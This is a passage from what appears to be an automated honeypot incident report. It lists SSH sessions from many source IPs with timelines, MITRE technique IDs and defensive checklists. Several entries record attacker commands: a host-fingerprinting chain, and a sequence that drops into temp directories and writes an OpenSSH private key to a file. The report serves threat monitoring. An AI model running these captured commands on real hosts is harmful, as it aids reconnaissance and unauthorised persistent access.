| **Source IP** | `154.20.33[.]172` |
| **First Seen** | 2026-08-22 16:17 |
| **Last Seen** | 2026-08-22 16:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:17:19` | `cowrie.session.connect` |
| `2026-08-22 16:17:20` | `cowrie.client.version` |
| `2026-08-22 16:17:20` | `cowrie.client.kex` |
| `2026-08-22 16:17:21` | `cowrie.login.success` |
| `2026-08-22 16:17:21` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.20.33[.]172` to AbuseIPDB if not already reported
- [ ] Block `154.20.33[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ef9bed7dc68

| Field | Detail |
|---|---|
| **Source IP** | `103.171.39[.]147` |
| **First Seen** | 2026-08-22 16:17 |
| **Last Seen** | 2026-08-22 16:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:17:27` | `cowrie.session.connect` |
| `2026-08-22 16:17:27` | `cowrie.client.version` |
| `2026-08-22 16:17:27` | `cowrie.client.kex` |
| `2026-08-22 16:17:29` | `cowrie.login.success` |
| `2026-08-22 16:17:30` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04b9251849ab

| Field | Detail |
|---|---|
| **Source IP** | `27.223.98[.]117` |
| **First Seen** | 2026-08-22 16:17 |
| **Last Seen** | 2026-08-22 16:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:17:31` | `cowrie.session.connect` |
| `2026-08-22 16:17:32` | `cowrie.client.version` |
| `2026-08-22 16:17:32` | `cowrie.client.kex` |
| `2026-08-22 16:17:34` | `cowrie.login.success` |
| `2026-08-22 16:17:35` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.223.98[.]117` to AbuseIPDB if not already reported
- [ ] Block `27.223.98[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45c032b10677

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:17 |
| **Last Seen** | 2026-08-22 16:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:17:33` | `cowrie.session.connect` |
| `2026-08-22 16:17:33` | `cowrie.client.version` |
| `2026-08-22 16:17:33` | `cowrie.client.kex` |
| `2026-08-22 16:17:34` | `cowrie.login.success` |
| `2026-08-22 16:17:35` | `cowrie.session.params` |
| `2026-08-22 16:17:35` | `cowrie.command.input` |
| `2026-08-22 16:17:35` | `cowrie.command.input` |
| `2026-08-22 16:17:35` | `cowrie.command.input` |
| `2026-08-22 16:17:35` | `cowrie.command.input` |
| `2026-08-22 16:17:35` | `cowrie.command.input` |
| `2026-08-22 16:17:35` | `cowrie.command.success` |
| `2026-08-22 16:17:35` | `cowrie.command.input` |
| `2026-08-22 16:17:35` | `cowrie.command.input` |
| `2026-08-22 16:17:35` | `cowrie.command.input` |
| `2026-08-22 16:17:35` | `cowrie.command.input` |
| `2026-08-22 16:17:35` | `cowrie.log.closed` |
| `2026-08-22 16:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9709c0242225

| Field | Detail |
|---|---|
| **Source IP** | `27.115.72[.]122` |
| **First Seen** | 2026-08-22 16:17 |
| **Last Seen** | 2026-08-22 16:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:17:40` | `cowrie.session.connect` |
| `2026-08-22 16:17:41` | `cowrie.client.version` |
| `2026-08-22 16:17:41` | `cowrie.client.kex` |
| `2026-08-22 16:17:44` | `cowrie.login.success` |
| `2026-08-22 16:17:45` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.115.72[.]122` to AbuseIPDB if not already reported
- [ ] Block `27.115.72[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2473ac29860

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:19 |
| **Last Seen** | 2026-08-22 16:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:19:02` | `cowrie.session.connect` |
| `2026-08-22 16:19:02` | `cowrie.client.version` |
| `2026-08-22 16:19:02` | `cowrie.client.kex` |
| `2026-08-22 16:19:02` | `cowrie.login.success` |
| `2026-08-22 16:19:04` | `cowrie.session.params` |
| `2026-08-22 16:19:04` | `cowrie.command.input` |
| `2026-08-22 16:19:04` | `cowrie.command.input` |
| `2026-08-22 16:19:04` | `cowrie.command.input` |
| `2026-08-22 16:19:04` | `cowrie.command.input` |
| `2026-08-22 16:19:04` | `cowrie.command.input` |
| `2026-08-22 16:19:04` | `cowrie.command.success` |
| `2026-08-22 16:19:04` | `cowrie.command.input` |
| `2026-08-22 16:19:04` | `cowrie.command.input` |
| `2026-08-22 16:19:04` | `cowrie.command.input` |
| `2026-08-22 16:19:04` | `cowrie.command.input` |
| `2026-08-22 16:19:04` | `cowrie.log.closed` |
| `2026-08-22 16:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e956efa8a923

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 16:19 |
| **Last Seen** | 2026-08-22 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:19:59` | `cowrie.session.connect` |
| `2026-08-22 16:19:59` | `cowrie.client.version` |
| `2026-08-22 16:19:59` | `cowrie.client.kex` |
| `2026-08-22 16:20:00` | `cowrie.login.success` |
| `2026-08-22 16:20:00` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:20:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 16:20:00` | `cowrie.direct-tcpip.data` |
| `2026-08-22 16:20:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfe646192ddd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 16:20 |
| **Last Seen** | 2026-08-22 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:20:02` | `cowrie.session.connect` |
| `2026-08-22 16:20:02` | `cowrie.client.version` |
| `2026-08-22 16:20:03` | `cowrie.client.kex` |
| `2026-08-22 16:20:04` | `cowrie.login.success` |
| `2026-08-22 16:20:04` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:20:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 16:20:04` | `cowrie.direct-tcpip.data` |
| `2026-08-22 16:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5310cb14bc9

| Field | Detail |
|---|---|
| **Source IP** | `41.63.63[.]211` |
| **First Seen** | 2026-08-22 16:25 |
| **Last Seen** | 2026-08-22 16:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:25:33` | `cowrie.session.connect` |
| `2026-08-22 16:25:33` | `cowrie.client.version` |
| `2026-08-22 16:25:34` | `cowrie.client.kex` |
| `2026-08-22 16:25:35` | `cowrie.login.success` |
| `2026-08-22 16:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.63[.]211` to AbuseIPDB if not already reported
- [ ] Block `41.63.63[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c57c96e25cbe

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-22 16:25 |
| **Last Seen** | 2026-08-22 16:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:25:36` | `cowrie.session.connect` |
| `2026-08-22 16:25:36` | `cowrie.client.version` |
| `2026-08-22 16:25:36` | `cowrie.client.kex` |
| `2026-08-22 16:25:36` | `cowrie.login.success` |
| `2026-08-22 16:25:38` | `cowrie.session.params` |
| `2026-08-22 16:25:38` | `cowrie.command.input` |
| `2026-08-22 16:25:38` | `cowrie.session.file_download` |
| `2026-08-22 16:25:38` | `cowrie.session.file_download` |
| `2026-08-22 16:25:38` | `cowrie.log.closed` |
| `2026-08-22 16:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38bf62b149d2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 16:30 |
| **Last Seen** | 2026-08-22 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:30:00` | `cowrie.session.connect` |
| `2026-08-22 16:30:00` | `cowrie.client.version` |
| `2026-08-22 16:30:00` | `cowrie.client.kex` |
| `2026-08-22 16:30:01` | `cowrie.login.success` |
| `2026-08-22 16:30:01` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:30:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 16:30:01` | `cowrie.direct-tcpip.data` |
| `2026-08-22 16:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8639a3ffba11

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 16:30 |
| **Last Seen** | 2026-08-22 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:30:05` | `cowrie.session.connect` |
| `2026-08-22 16:30:05` | `cowrie.client.version` |
| `2026-08-22 16:30:06` | `cowrie.client.kex` |
| `2026-08-22 16:30:06` | `cowrie.login.success` |
| `2026-08-22 16:30:07` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:30:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 16:30:07` | `cowrie.direct-tcpip.data` |
| `2026-08-22 16:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba178dbdc014

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-08-22 16:31 |
| **Last Seen** | 2026-08-22 16:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:31:04` | `cowrie.session.connect` |
| `2026-08-22 16:31:05` | `cowrie.client.version` |
| `2026-08-22 16:31:05` | `cowrie.client.kex` |
| `2026-08-22 16:31:07` | `cowrie.login.success` |
| `2026-08-22 16:31:08` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:31:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c43756f150aa

| Field | Detail |
|---|---|
| **Source IP** | `185.246.217[.]106` |
| **First Seen** | 2026-08-22 16:34 |
| **Last Seen** | 2026-08-22 16:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:34:54` | `cowrie.session.connect` |
| `2026-08-22 16:34:54` | `cowrie.client.version` |
| `2026-08-22 16:34:54` | `cowrie.client.kex` |
| `2026-08-22 16:34:56` | `cowrie.login.success` |
| `2026-08-22 16:34:56` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.246.217[.]106` to AbuseIPDB if not already reported
- [ ] Block `185.246.217[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfff976c518

| Field | Detail |
|---|---|
| **Source IP** | `182.75.234[.]236` |
| **First Seen** | 2026-08-22 16:35 |
| **Last Seen** | 2026-08-22 16:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:35:01` | `cowrie.session.connect` |
| `2026-08-22 16:35:02` | `cowrie.client.version` |
| `2026-08-22 16:35:02` | `cowrie.client.kex` |
| `2026-08-22 16:35:04` | `cowrie.login.success` |
| `2026-08-22 16:35:05` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:35:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.234[.]236` to AbuseIPDB if not already reported
- [ ] Block `182.75.234[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c3f762c6a07

| Field | Detail |
|---|---|
| **Source IP** | `210.195.205[.]7` |
| **First Seen** | 2026-08-22 16:39 |
| **Last Seen** | 2026-08-22 16:40 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:39:50` | `cowrie.session.connect` |
| `2026-08-22 16:39:52` | `cowrie.client.version` |
| `2026-08-22 16:39:52` | `cowrie.client.kex` |
| `2026-08-22 16:39:55` | `cowrie.login.success` |
| `2026-08-22 16:39:56` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.195.205[.]7` to AbuseIPDB if not already reported
- [ ] Block `210.195.205[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb7204f06f6e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 16:40 |
| **Last Seen** | 2026-08-22 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:40:06` | `cowrie.session.connect` |
| `2026-08-22 16:40:06` | `cowrie.client.version` |
| `2026-08-22 16:40:06` | `cowrie.client.kex` |
| `2026-08-22 16:40:07` | `cowrie.login.success` |
| `2026-08-22 16:40:07` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:40:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 16:40:07` | `cowrie.direct-tcpip.data` |
| `2026-08-22 16:40:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a61af700cb81

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 16:40 |
| **Last Seen** | 2026-08-22 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:40:10` | `cowrie.session.connect` |
| `2026-08-22 16:40:10` | `cowrie.client.version` |
| `2026-08-22 16:40:10` | `cowrie.client.kex` |
| `2026-08-22 16:40:11` | `cowrie.login.success` |
| `2026-08-22 16:40:11` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:40:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 16:40:11` | `cowrie.direct-tcpip.data` |
| `2026-08-22 16:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9934f971a6d7

| Field | Detail |
|---|---|
| **Source IP** | `165.99.71[.]193` |
| **First Seen** | 2026-08-22 16:47 |
| **Last Seen** | 2026-08-22 16:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:47:59` | `cowrie.session.connect` |
| `2026-08-22 16:47:59` | `cowrie.client.version` |
| `2026-08-22 16:47:59` | `cowrie.client.kex` |
| `2026-08-22 16:48:01` | `cowrie.login.success` |
| `2026-08-22 16:48:02` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.99.71[.]193` to AbuseIPDB if not already reported
- [ ] Block `165.99.71[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-984c452b601f

| Field | Detail |
|---|---|
| **Source IP** | `121.99.190[.]167` |
| **First Seen** | 2026-08-22 16:48 |
| **Last Seen** | 2026-08-22 16:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:48:07` | `cowrie.session.connect` |
| `2026-08-22 16:48:08` | `cowrie.client.version` |
| `2026-08-22 16:48:08` | `cowrie.client.kex` |
| `2026-08-22 16:48:11` | `cowrie.login.success` |
| `2026-08-22 16:48:11` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.99.190[.]167` to AbuseIPDB if not already reported
- [ ] Block `121.99.190[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e010ce67237

| Field | Detail |
|---|---|
| **Source IP** | `182.42.113[.]10` |
| **First Seen** | 2026-08-22 16:49 |
| **Last Seen** | 2026-08-22 16:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:49:58` | `cowrie.session.connect` |
| `2026-08-22 16:49:59` | `cowrie.client.version` |
| `2026-08-22 16:49:59` | `cowrie.client.kex` |
| `2026-08-22 16:50:02` | `cowrie.login.success` |
| `2026-08-22 16:50:03` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.42.113[.]10` to AbuseIPDB if not already reported
- [ ] Block `182.42.113[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92f56b7eae14

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 16:50 |
| **Last Seen** | 2026-08-22 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:50:02` | `cowrie.session.connect` |
| `2026-08-22 16:50:02` | `cowrie.client.version` |
| `2026-08-22 16:50:02` | `cowrie.client.kex` |
| `2026-08-22 16:50:03` | `cowrie.login.success` |
| `2026-08-22 16:50:03` | `cowrie.direct-tcpip.request` |
